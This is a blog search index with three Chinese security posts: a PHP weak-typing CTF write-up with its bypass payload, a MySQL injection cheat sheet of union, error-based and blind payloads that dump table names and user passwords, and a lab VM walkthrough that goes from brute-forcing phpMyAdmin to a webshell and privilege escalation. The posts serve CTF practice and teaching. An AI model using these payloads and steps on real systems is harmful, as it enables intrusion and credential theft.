<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[CTF中的php弱类型]]></title>
      <url>/2017/10/10/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/</url>
      <content type="html"><![CDATA[<h1 id="PHP弱类型在CTF中的应用"><a href="#PHP弱类型在CTF中的应用" class="headerlink" title="PHP弱类型在CTF中的应用"></a>PHP弱类型在CTF中的应用</h1><p><img src="http://ourd90bac.bkt.clouddn.com/14.jpg" alt=""></p>
<blockquote>
<p>如果你经常接触到CTF比赛，那么你一定对php代码审计的题不会陌生。本篇文章将由CTF比赛引申对php弱类型进行一些总结。</p>
</blockquote>
<a id="more"></a>
<h2 id="基础引入"><a href="#基础引入" class="headerlink" title="基础引入"></a>基础引入</h2><h3 id="什么是php弱类型"><a href="#什么是php弱类型" class="headerlink" title="什么是php弱类型"></a>什么是php弱类型</h3><p>php在变量的声明时不需要直接声明变量的类型，而变量的类型是由程序的上下文决定的。</p>
<h3 id="数据转换"><a href="#数据转换" class="headerlink" title="数据转换"></a>数据转换</h3><p>php中只存在，整型、浮点型、布尔、NULL型变量的转换。但是特别注意，一般在自动转换时通常是后两者转换为前两者。</p>
<p>布尔值参与运算时，TRUE转换为整型1，FALSE转换为整型0运算。</p>
<p>有NULL只参与运算时，NULL转换为整型0进行运算。</p>
<p>有整型与浮点型参与运算时，将整型转换为浮点型进行运算。</p>
<p>有字符串型与数字类型的数据进行运算时，将字符串转换为数字类型进行运算。如：<br>“123abc”转化为123,”123.456abc”转换为123.456，”abc”转换为整型0。</p>
<h3 id="php中的运算符"><a href="#php中的运算符" class="headerlink" title="php中的运算符"></a>php中的运算符</h3><p>首先看如下代码：</p>
<pre><code>&lt;?php
$a = 0;

var_dump( $a &gt; 0);
var_dump( $a &lt; true);
var_dump( $a &gt;= 0.01);
var_dump( $a &lt;= &quot;0.10yuan&quot;);
var_dump( $a = 0);
var_dump( $a == 0);
var_dump( $a == &quot;0&quot;);
var_dump( $a === &quot;0&quot;);
var_dump( $a === 0);
var_dump( $a &lt;&gt; 0);
var_dump( $a != 0);
var_dump( $a != 1);
?&gt;
</code></pre><p>输出如下：<br>  <img src="http://ourd90bac.bkt.clouddn.com/php.jpg" alt=""></p>
<p>可见当<code>$a == &quot;0&quot;</code>输出正确，而<code>$a === &quot;0&quot;</code>却是错误的。这是为什么呢？原因就在于php中“==”与“===”的区别。前者是一种模糊等于，只会比较内容的值，不会比较内容的类型，也就是后面提到了松散比较。而后者是一种严格的等于判断，会将内容与内容类型都进行判断。这是php作为弱类型语言的一种特点。</p>
<p>接下来将用一道CTF题来了解下实际情况中常见的php弱类型。</p>
<h2 id="php源码分析"><a href="#php源码分析" class="headerlink" title="php源码分析"></a>php源码分析</h2><blockquote>
<p>整型与字符串的纠葛<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">show_source(<span class="keyword">__FILE__</span>); </div><div class="line">$a=<span class="number">0</span>; </div><div class="line">$b=<span class="number">0</span>; </div><div class="line">$c=<span class="number">0</span>; </div><div class="line">$d=<span class="number">0</span>; </div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'x1'</span>])) </div><div class="line">&#123; </div><div class="line">        $x1 = $_GET[<span class="string">'x1'</span>]; </div><div class="line">        $x1==<span class="string">"1"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </div><div class="line">        <span class="keyword">switch</span> ($x1) </div><div class="line">        &#123; </div><div class="line">        <span class="keyword">case</span> <span class="number">0</span>: </div><div class="line">        <span class="keyword">case</span> <span class="number">1</span>: </div><div class="line">                $a=<span class="number">1</span>; </div><div class="line">                <span class="keyword">break</span>; </div><div class="line">        &#125; </div><div class="line">&#125; </div><div class="line">$x2=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'x2'</span>]); </div><div class="line"><span class="keyword">if</span>(is_array($x2))&#123; </div><div class="line">    is_numeric(@$x2[<span class="string">"x21"</span>])?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </div><div class="line">    <span class="keyword">if</span>(@$x2[<span class="string">"x21"</span>])&#123; </div><div class="line">        ($x2[<span class="string">"x21"</span>]&gt;<span class="number">2017</span>)?$b=<span class="number">1</span>:<span class="keyword">NULL</span>; </div><div class="line">    &#125; </div><div class="line">    <span class="keyword">if</span>(is_array(@$x2[<span class="string">"x22"</span>]))&#123; </div><div class="line">        <span class="keyword">if</span>(count($x2[<span class="string">"x22"</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array($x2[<span class="string">"x22"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"ha?"</span>); </div><div class="line">        $p = array_search(<span class="string">"XIPU"</span>, $x2[<span class="string">"x22"</span>]); </div><div class="line">        $p===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </div><div class="line">        <span class="keyword">foreach</span>($x2[<span class="string">"x22"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123; </div><div class="line">            $val===<span class="string">"XIPU"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </div><div class="line">        &#125; </div><div class="line">        $c=<span class="number">1</span>; </div><div class="line">&#125; </div><div class="line">&#125; </div><div class="line">$x3 = $_GET[<span class="string">'x3'</span>]; </div><div class="line"><span class="keyword">if</span> ($x3 != <span class="string">'15562'</span>) &#123; </div><div class="line">    <span class="keyword">if</span> (strstr($x3, <span class="string">'XIPU'</span>)) &#123; </div><div class="line">        <span class="keyword">if</span> (substr(md5($x3),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">'15562'</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123; </div><div class="line">            $d=<span class="number">1</span>; </div><div class="line">        &#125; </div><div class="line">    &#125; </div><div class="line">&#125; </div><div class="line"><span class="keyword">if</span>($a &amp;&amp; $b &amp;&amp; $c &amp;&amp; $d)&#123; </div><div class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>; </div><div class="line">    <span class="keyword">echo</span> $flag; </div><div class="line">&#125; </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
</blockquote>
<p>首先通读全部代码，这里得到flag的条件是变量<code>$a、$b、$c、$d</code>的值都要等于1。</p>
<h3 id="分步解题"><a href="#分步解题" class="headerlink" title="分步解题"></a>分步解题</h3><ul>
<li><code>$a = 1</code></li>
</ul>
<p>要使变量等于1，要经过两层比较。首先在<code>$x1 == 1</code>的松散比较中要不等于”1”，这个很好过，任意不为1的值都可以。然后将<code>NULL</code>赋给<code>$x1</code>。接着进行了一次<code>switch</code>语句的比较。按照官方文档的说法,Switch中为确保精度，建议只使用比较整型和字符串。但由于php弱语言的缘故，所以也可以使用任意类型进行比较。那么这里我们<code>$x1</code>为<code>NULL</code>值就会和整型0进行一次松散的双等比较，于是为<code>true</code>。最终<code>$a = 1</code>。</p>
<ul>
<li><code>$b = 1</code>与<code>$c = 1</code></li>
</ul>
<p>源代码程序继续往下读，首先<code>json_decode</code>将传入的<code>$x2</code>数据进行json格式编码，说明我们需要传入一个数组，用的是json格式。接着<code>is_numeric</code>和与整型2017的判断是php弱类型题中的典型判断。由前面提到的整型与字符串型的比较知识中我们不难构造”2018a”这样的形式来绕过这里的判断使<code>$b = 1</code>。接着使用<code>array_search</code>函数对<code>$x2[&quot;x22&quot;]</code>进行匹配。但是同样的，在php函数中<code>array_search</code>函数进行的匹配也是通过松散的双等比较进行的，这里如果数组里有一个0值，字符串”XIPU”就会通过双等自动转换为0，从而匹配成功。综上，所以我们这里构造payload为<code>x2={&quot;x21&quot;:&quot;2018a&quot;;&quot;x22&quot;:[[1],0]}</code>就可以成功绕过了。</p>
<ul>
<li><code>$c = 1</code></li>
</ul>
<p>这里运用的是php中0e弱类型比较，只要是0e开头的字符串在双等的松散判断下都是相等的，这里涉及md5加密，直接截取它的代码，修改下成小脚本跑一下就出来了。</p>
<p>全部的payload为：<code>?x1=a1&amp;x2={&quot;x21&quot;:&quot;2018a&quot;,&quot;x22&quot;:[[1],0]}&amp;x3=XIPU18570</code></p>
<p><strong>小结</strong>：以上的弱类型转换中是整型与字符串类型的转换。</p>
<blockquote>
<p>数组与字符串的纠葛</p>
</blockquote>
<p>看以下源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">   <span class="keyword">if</span>(!strcmp($c[<span class="number">1</span>],$d) &amp;&amp; $c[<span class="number">1</span>]!==$d)&#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"You in,You win"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"Get out!"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>源码中使用<code>strcmp</code>函数对变量<code>$c</code>与<code>$d</code>进行比较，其特点是将两个变量转换为ascii码后进行前者减后者，并返回一个int类型的相减后的结果。这样我们不难发现，<code>strcmp</code>在比较数字类型与字符串类型时，返回的数据都是正常的，但是一旦遇到其中数组类型的比较呢？答案是NULL<br>所以我们这里构造数组与其比较就会构造成恒为真，从而绕过判断，进入if中。</p>
<p><strong>补充</strong>：php中数组转换成其他类型的后的值：</p>
<p>Array转换整型int/浮点型float会返回元素个数；<br>转换bool返回Array中是否有元素；转换成string返回’Array’，并抛出warning。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>从上面这个例子可以看出php弱类型的成因在其对数据类型的处理上，体现在存在双等松散比较的条件判断与函数判断中。</p>
<p>其实php对字符串的自动转化相当于使用<code>intval()</code>函数对字符串进行强制转换，只要存在字符串与数字类型的双等松散比较中就存在这种强制转换。造成这种现象的原因就在于php内核中对弱类型的封装，其存在于<code>zval</code>结构中：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> _zval_struct zval;</div><div class="line">	<span class="keyword">struct</span> _zval_struct &#123;  </div><div class="line">    <span class="comment">/* Variable information */</span>  </div><div class="line">    zvalue_value value;     <span class="comment">/* value */</span>  </div><div class="line">    zend_uint refcount__gc;  </div><div class="line">    zend_uchar type;    <span class="comment">/* active type */</span>  </div><div class="line">    zend_uchar is_ref__gc;  </div><div class="line">	&#125;;  </div><div class="line"></div><div class="line">	<span class="keyword">typedef</span> <span class="keyword">union</span> _zvalue_value &#123;  </div><div class="line">    <span class="keyword">long</span> lval;  <span class="comment">/* long value */</span>  </div><div class="line">    <span class="keyword">double</span> dval;    <span class="comment">/* double value */</span>  </div><div class="line">    <span class="keyword">struct</span> &#123;  </div><div class="line">        	<span class="keyword">char</span> *val;  </div><div class="line">        	<span class="keyword">int</span> len;  </div><div class="line">    	&#125; str;  </div><div class="line">    HashTable *ht;  <span class="comment">/* hash table value */</span>  </div><div class="line">    zend_object_value obj;  </div><div class="line">	&#125; zvalue_value;</div></pre></td></tr></table></figure>]]></content>
      
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 渗透 </tag>
            
            <tag> php </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MySql 注入杂记]]></title>
      <url>/2017/10/06/MySQL%E6%B3%A8%E5%85%A5%E6%9D%82%E8%AE%B0/</url>
      <content type="html"><![CDATA[<h1 id="MySQL注入杂记"><a href="#MySQL注入杂记" class="headerlink" title="MySQL注入杂记"></a>MySQL注入杂记</h1><p><img src="http://ourd90bac.bkt.clouddn.com/mysql.jpg" alt=""></p>
<h2 id="1-基础知识准备："><a href="#1-基础知识准备：" class="headerlink" title="1.基础知识准备："></a>1.基础知识准备：</h2><h3 id="sql注入的分类"><a href="#sql注入的分类" class="headerlink" title="sql注入的分类"></a>sql注入的分类</h3><ul>
<li>基于从服务器的响应：<br>1.基于错误的sql注入；<br>2.联合查询的类型；<br>3.SQL盲注：<pre><code>基于布尔的盲注
基于时间的盲注
基于报错的盲注
</code></pre><a id="more"></a></li>
<li><p>基于注入的数据类型：<br>1.基于字符串<br>2.基于数字</p>
</li>
<li><p>基于程度和顺序<br>1.一阶注入；<br>2.二阶注入；<br>3.</p>
</li>
<li>基于注入位置<br>1.基于用户输入表单域的注入；<br>2.通过cookie注入；<br>3.通过服务器变量注入。（基于头部信息注入）</li>
</ul>
<h3 id="MySQL系统函数"><a href="#MySQL系统函数" class="headerlink" title="MySQL系统函数"></a>MySQL系统函数</h3><p>1.version() :mysql版本信息<br>2.user():数据库用户名<br>3.database():数据库名<br>4.@@datadir():数据库路径<br>5.@@version_compile_os():操作系统版本</p>
<p>###函数介绍<br>1.concat(str1,str2,….):没有分隔符地连接字符串<br>2.concat_ws(separator.str1,str2,…)含有分隔符地连接字符串<br>3.group_concat(str1,str2,…):连接一族所有的字符串，并用逗号分隔</p>
<h2 id="2-GET联合查询（有回显报错）"><a href="#2-GET联合查询（有回显报错）" class="headerlink" title="2.GET联合查询（有回显报错）"></a>2.GET联合查询（有回显报错）</h2><p>1.测试<code>id</code>值后的闭合符号，以及注释符。</p>
<blockquote>
<p>常见注释：<br>–+<br>#<br>`</p>
</blockquote>
<p>2.<code>order by</code>联合查询，找出相应的列数</p>
<p>3.<code>union select</code>联合查询注入。如下：</p>
<p><strong>查询所有数据库</strong>：<code>id=-1&#39; union select 1, group_concat(table_schema),3 from information_schema.schemata--+</code></p>
<p>注：这里我们假设查询出<code>security</code>数据库</p>
<p><strong>查询表名（table）</strong>：<code>id=-1&#39; union select 1, group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code></p>
<p><strong>查询列名（column）</strong>：<code>id=-1&#39; union select 1, group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;--+</code></p>
<p><strong>查询字段名</strong>：<code>id=-1 union select 1,username,password from users where id=2--+</code></p>
<p>##3. GET报错注入（无回显）<br>此种注入时区别于上一种联合查询的有回显报错的，此种无回显报错注入只能用到另外的函数来进行报错回显注入。</p>
<ul>
<li><p><code>extractvalue</code><br>其核心的语句大家都应该能看出是<code>select</code>后查询语句。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">#爆数据库</div><div class="line">and extractvalue(0x0a,concat(0x0a,(select database())))-- </div><div class="line">#爆表</div><div class="line">and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))-- </div><div class="line">#爆列</div><div class="line">and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name=’users’ limit 0,1)))-- </div><div class="line">#爆字段</div><div class="line">and extractvalue(0x0a,concat(0x0a,(select count(username,0x3a,password) from users limit 0,1)))--</div></pre></td></tr></table></figure>
</li>
<li><p><code>updatexml</code><br>与上面的<code>extractvalue</code>相差不大</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and 1=(updatexml(0x3a,concat(1,(<span class="keyword">select</span> <span class="keyword">database</span>())),<span class="number">1</span>))<span class="comment">--</span></div></pre></td></tr></table></figure>
</li>
<li><p><code>floor</code><br>同上</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">union+<span class="keyword">select</span>+<span class="number">1</span>+<span class="keyword">from</span>+(<span class="keyword">select</span>+<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>),(<span class="keyword">select</span>+table_name+<span class="keyword">from</span>+information_schema.tables+<span class="keyword">where</span>+table_schema=<span class="keyword">database</span>()+<span class="keyword">limit</span>+<span class="number">0</span>,<span class="number">1</span>))a+<span class="keyword">from</span>+information_schema.tables+<span class="keyword">group</span>+<span class="keyword">by</span>+a)b</div></pre></td></tr></table></figure>
</li>
</ul>
<p>##4. 盲注的相关知识</p>
<ul>
<li>基于布尔盲注—–构造逻辑结构判断</li>
</ul>
<p>相关字符串截取函数：<br>1.<code>left(database(),1)&gt;&#39;s&#39;</code>   ：database()显示数据库名，left(a,b)从左侧截取a的前b位<br>2.<code>ascii(substr(select table_name from information_schema.tables where table_schema = database() limit 0,1)1,1)--+</code>：substr(a,b,c)从b位置开始，截取字符串a的c长度，ascii()将字符转换为ascii码格式。</p>
<blockquote>
<p><code>substr()</code>的小技巧：例如在<code>substr(database(),1,1)</code>中逗号被过滤了，我们可以使用<code>from 1 to 1</code>来绕过过滤。<br>那么有同样格式的<code>limit 0,1</code>有没有这样的绕过呢？当然有。格式为：<code>1 offset 0</code>这里注查询数字的顺序。</p>
</blockquote>
<p>3.<code>ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER
BY id LIMIT 0,1),1,1))&gt;98%23</code>: mid(a,b,c)从位置b开始，截取字符串a的c位。ord()函数和ascii()函数一样将字符转为ascii码。</p>
<ul>
<li>基于报错的MySQL盲注</li>
<li>基于时间的盲注<br><code>if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</code>if(a,b,c)若a成立，就执行c，不成立就执行b</li>
</ul>
<h3 id="GET布尔盲注"><a href="#GET布尔盲注" class="headerlink" title="GET布尔盲注"></a>GET布尔盲注</h3><ul>
<li><p>判断数据库<br>可以使用两种函数判断：<br>1.<code>id=1&#39; and left(database(),1)=&#39;s&#39;--+</code>：直接判断数据库的名字，缺点就是受限于left函数的用法，不能进行每一位的单个字符的判断。<br>2.<code>id=1&#39; and ascii(substr(database(),1,1))=89--+</code>：和上面的语句一样用于判断数据库名，在使用脚本时用此句就行。</p>
</li>
<li><p>爆数据库下的表名<br><code>id=1&#39; and ascii(substr(select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=136--+</code><br><em>解释</em>：<code>limit 0,1</code>中0是表示从第一个表（若数据库有多个表）开始，接着的1表示获取第一个。</p>
</li>
<li><p>获取字段内的值（获取字段名就和上面获取表名的操作是一样的）<br>假设我们从上一步的操作中获取了一个名叫<code>users</code>的字段，一般想来这个字段中肯定含有我们想要得到的用户名和密码，所以这里就可以用到正则注入。</p>
</li>
</ul>
<p>1.<code>id=1&#39; and 1=(select 1 frominformation schema.columns where table_name=&#39;users&#39; and column_name regexp &#39;^us[a-z]&#39; limit 0,1)--+</code></p>
<p><strong>注意</strong>：select后的1表示我们查询的是这个字段的第一个值，若我们想查询其他字段中的值，直接更换这里的’users’即可，所以这里的limit 0,1起不到限定作用，可有可无。</p>
<p>2.使用<code>ord()</code>与<code>mid()</code>函数</p>
<p>解释：这里的mid()函数与substr()函数类似，有一样的功能。函数原型为：<code>MID(ColumnName, Start [, Length])</code>对字符串从start位置开始截取相应的长度。这里我就可以在substr()被禁的情况下做替换。</p>
<h2 id="4-POST注入"><a href="#4-POST注入" class="headerlink" title="4.POST注入"></a>4.POST注入</h2><p>常见的Post注入分为两类：</p>
<ol>
<li><p>同时验证用户名和密码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$sql = select * from users where username=$usernmae <span class="keyword">and</span> password=$password limit <span class="number">1</span>,<span class="number">1</span></div><div class="line">$result = mysql_query($sql);</div><div class="line"><span class="keyword">if</span>($result) &#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"登陆成功"</span>;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"登陆失败"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>用户名与密码分步验证</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$sql = <span class="string">"select password from users where username='$username'"</span></div><div class="line">$result = mysql_query($sql);</div><div class="line"><span class="keyword">if</span>($result) &#123;</div><div class="line">    $row = mysql_fetch_row($result);</div><div class="line">    $query_password = $row[$password];</div><div class="line">    <span class="comment">#对输入的$password进行变形</span></div><div class="line">    $input_password = modify($passowrd);</div><div class="line">    <span class="keyword">if</span>($input_password == $query_password) &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"登陆成功"</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"密码错误"</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"用户不存在"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ol>
<p>我们在大多数情况下遇到的都是第一种情况，其实第一种情况与第二种情况并无太大区别，就是在查询成功后页面返回不同而已。其余的都和普通的注入一样。这里就不再反复赘述。</p>
]]></content>
      
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Blackb0x 服务器渗透]]></title>
      <url>/2017/08/16/Blackb0x-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B8%97%E9%80%8F/</url>
      <content type="html"><![CDATA[<h1 id="一次虚拟机服务器的内网渗透"><a href="#一次虚拟机服务器的内网渗透" class="headerlink" title="一次虚拟机服务器的内网渗透"></a>一次虚拟机服务器的内网渗透</h1><p><img src="http://ourd90bac.bkt.clouddn.com/timg.jpg" alt=""></p>
<blockquote>
<p>D0g3第三次测试的题目，整个题目拥有7个<em>flag</em>。目标主机是一个Windows2003虚拟机，登录密码非弱口令，无法通过字典爆破的形式进行简单的进入，需进行常规的内网渗透程序进行渗透。</p>
</blockquote>
<hr>
<a id="more"></a>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><ul>
<li><strong>获取目标IP</strong><blockquote>
<p>建议VM虚拟机使用桥接的方式，<em>kali</em>虚拟机也是用桥接模式，这样在一个网段才能扫到IP，实验也更贴近实战。</p>
</blockquote>
</li>
</ul>
<p>使用<strong>kali Linux</strong>。终端 <em>netdiscover</em>命令获取同网段的主机IP(192.168.2.116)</p>
<p><img src="http://ourd90bac.bkt.clouddn.com/Kali.png" alt=""></p>
<ul>
<li><strong>端口扫描</strong></li>
</ul>
<p>使用<em>zenmap</em>（nmap的图形化版本）进行端口扫描，扫描参数使用默认的就可以了。扫描结果如下：</p>
<p><img src="http://ourd90bac.bkt.clouddn.com/flag1-1.png" alt=""></p>
<p>从扫描结果可以发现开放了： 21/tcp、80/tcp端口，这两个服务分别对应着<a href="https://baike.baidu.com/item/ftp/13839?fr=aladdin" target="_blank" rel="external">文件传输协议</a>与<a href="https://baike.baidu.com/item/http/243074?fromtitle=%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE&amp;fromid=8535513" target="_blank" rel="external">web</a>服务，即服务器设有网站，并且还发现了一个<em>phpinfo()</em>页面。打开后获得第一条<em>flag</em>。</p>
<p><img src="http://ourd90bac.bkt.clouddn.com/flag1-2.png" alt=""></p>
<p>于是现在就提供了两条思路。1.通过ftp协议进行远程访问，获取服务器的有用信息；2.通过找到服务器搭载的网站进行渗透，getshell后进行提权拿到服务器。</p>
<ul>
<li><strong>目录扫描</strong></li>
</ul>
<p>既然开了80端口，就不得不扫一波目录了。</p>
<p><img src="http://ourd90bac.bkt.clouddn.com/flag2-1.png" alt=""></p>
<p>果然发现有收获：点进<em>192.168.2.116/ftp.rar</em>得到有个ftp程序的压缩包。解压：</p>
<p>即获得第二个flag<br><img src="http://ourd90bac.bkt.clouddn.com/f2.png" alt=""></p>
<p>然后打开第二个文件夹中的ftp软件，在用户设置页面获得第三个flag。</p>
<p><img src="http://ourd90bac.bkt.clouddn.com/flag3.png" alt=""></p>
<h2 id="FTP利用"><a href="#FTP利用" class="headerlink" title="FTP利用"></a>FTP利用</h2><p>前三个flag拿得还是很轻松，基本的信息搜集就可以做到了，心里美滋滋。可是下一步怎么走就比较懵逼了。于是进一步进行搜集（瞎找）。</p>
<p>最后在压缩包的第二个.xml文件中找到了蛛丝马迹。因为这个xml文件是记录着ftp远程连接的用户名和密码，以前在服务器上大马利用ftp提权的时候会专门去找这个文件，这里发现这个文件应该是故意给出下一步渗透的提示，看来思路是正确的。</p>
<p><img src="http://ourd90bac.bkt.clouddn.com/ftp.png" alt=""></p>
<p>找到对应的用户名：<em>admin</em>，解出对应的md5的密码。应该就可以进行远程登陆了。</p>
<p><img src="http://ourd90bac.bkt.clouddn.com/ftp2.png" alt=""></p>
<p>登录之后获得一个hosts.bak的文件。这一步本想是偷懒上传一个五次shift的cmd后门，但是发现ftp链接后的权限被限制为只能读取了，所以感觉比较可惜啊。没办法，只有老老实实把hosts文件复制到本地再研究下了。</p>
<blockquote>
<p>关于hosts文件：hosts文件是电脑中用于对域名进行解析的文件。它的优先级要大于DNS服务器。也就是说，电脑在访问网站时会先根据hosts文件中的域名解析信息寻找目标网址IP，如果没找到才会发给DNS服务器进行解析。</p>
</blockquote>
<p>hosts文件内容如下：</p>
<pre><code>`127.0.0.1 admin.hack.me

 127.0.0.1 cms.hack.me`
</code></pre><p>现在分析下：”127.0.0.1”是服务器的本地地址，也就是服务器内访问admin.hack.me 和cms.hack.me时会被解析到本地(localhost)，也就是说本地一定存在对应这两个网站的网站。（但我扫目录的时候咋没扫出来，至少扫出一个才正常啊…….）</p>
<p>于是将hosts文件内容替换到本地，将 127.0.0.1 替换成目标的IP地址。分别访问，出现以下两个页面：</p>
<p>一个是<em>phpmyadmin</em>管理登录页面;<br>另一个是<em>joomla cms</em>网站的页面;</p>
<p><img src="http://ourd90bac.bkt.clouddn.com/admin.png" alt=""></p>
<p><img src="http://ourd90bac.bkt.clouddn.com/cms.png" alt=""></p>
<p>cms网站看了很久，没有找到版本号，exp那条路基本上比较难，而慢慢测试漏洞去突破显然不如搞phpmyadmin来得好点。所以就暂时放了一放cms。</p>
<p>phpmyadmin这里找了很久没有再发现有什么好的提示，试了下默认密码和匿名登录都不行，那就只有硬着头皮进行弱口令爆破了。于是下载了个phpmyadmin爆破工具，加载字典跑，在经历了近十次的误报后终于爆出了密码，登录进去。发现了第四个<em>flag</em></p>
<p><img src="http://ourd90bac.bkt.clouddn.com/flag3-3.png" alt=""></p>
<p>既然都拿到了root权限的数据库，那就可以找到刚才cms网站的后台密码进行登录，看有没有下一个flag或者在后天上传一句话getshell。<br>后来才发现网站的后台什么都没有，而且基本上没有发现可以很好地插一句话的地方。最后纠结了半天。才发现可以直接在数据库里直接写入一句句话，只要找到网站的绝对路径就可以了。而绝对路径在最初的<em>phpinfo()</em>页面就可以找到。</p>
<p>于是写入一句话：<br><img src="http://ourd90bac.bkt.clouddn.com/sql.png" alt=""></p>
<p>连上菜刀，getshell。并在网站根目录处拿到第五个<em>flag</em>。<br><img src="http://ourd90bac.bkt.clouddn.com/flag5-3.png" alt=""></p>
<hr>
<h2 id="服务器提权"><a href="#服务器提权" class="headerlink" title="服务器提权"></a>服务器提权</h2><p>既然拿到shell了，接下来就是常规的上大马提权服务器了。</p>
<blockquote>
<p>提权的思路一般有两种：1.利用服务器上高权限（主要指system权限）的服务进行提权；2.利用服务器的exp进行提权。</p>
</blockquote>
<p>一开始我想利用较为普遍的mysql数据库提权方式。但在试了udf、mof、nc反弹提权后均没有用，所得的用户都是users权限。最后只有看了下系统的补丁情况：</p>
<p><img src="http://ourd90bac.bkt.clouddn.com/system.png" alt=""></p>
<p>看来这下就可以利用大把的exp进行利用了。百度找到服务器没有打补丁的漏洞exp。利用成功。获取system权限，并创建属于administrator权限的用户，登录成功。</p>
